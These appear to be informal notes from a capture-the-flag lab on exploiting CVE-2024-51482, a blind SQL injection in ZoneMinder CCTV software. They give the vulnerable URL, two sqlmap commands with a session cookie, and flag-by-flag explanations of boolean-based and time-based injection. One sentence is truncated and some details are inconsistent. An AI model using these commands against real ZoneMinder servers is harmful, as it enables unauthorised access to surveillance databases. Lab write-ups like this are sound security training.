--found out that it has a vuln CVE-2024-51482 is a critical Boolean-based Blind SQL Injection vulnerability in ZoneMinder, an open-source CCTV surveillance software
--Trigger URL: http://[TARGET]/zm/index.php?view=request&request=event&action=removetag&tid=[INJECTION_POINT]

command
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=*" \
--cookie="ZMSESSID=79e4v7guebkneps7l6uq34e43j" \
--dbms=mysql --level=3 --risk=2 --batch --current-db --threads=5

--dbms=mysql	ZoneMinder uses MySQL/MariaDB. Specifying this stops sqlmap from wasting time testing payloads for PostgreSQL, Oracle, or SQLite.
--level=3	Increases the variety of payloads tested. Since this is an AJAX-based request, higher levels help ensure the injection is caught correctly.
--risk=2	This allows the tool to use heavy OR-based tests. Since the target is a DELETE query (based on the removetag action), you need this to properly manipulate the query logic.
--technique=B	Forces sqlmap to use Boolean-based blind techniques. Since we know this CVE is blind, this skips unnecessary time-based or error-based tests.
--threads=5	Speeds up the data extraction by sending multiple requests at once. (Don't go too high, or you might crash the web server).
--current-db	Once the connection is confirmed, this will immediately tell you the name of the database you're looking at.

the command is then changed to 
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1*" \
--cookie="ZMSESSID=79e4v7guebkneps7l6uq34e43j" \
--dbms=mysql --batch --level=5 --risk=3 \
--technique=T --time-sec=5 --threads=1 \
--current-db
ased injection, you must use 1 thread. If you send multiple requests at once, the timing overlaps and sqlmap gets confused.

--time-sec=5: Sets a clear 5-second delay for the "True" response to make it obvious to the tool.
here the technique was cahnged from B to T .From blind to time based .it uses sleep .that is to timethe response -give detailed explanation .
THIS GIVES US THE CURRENT DATABASE which is zm 
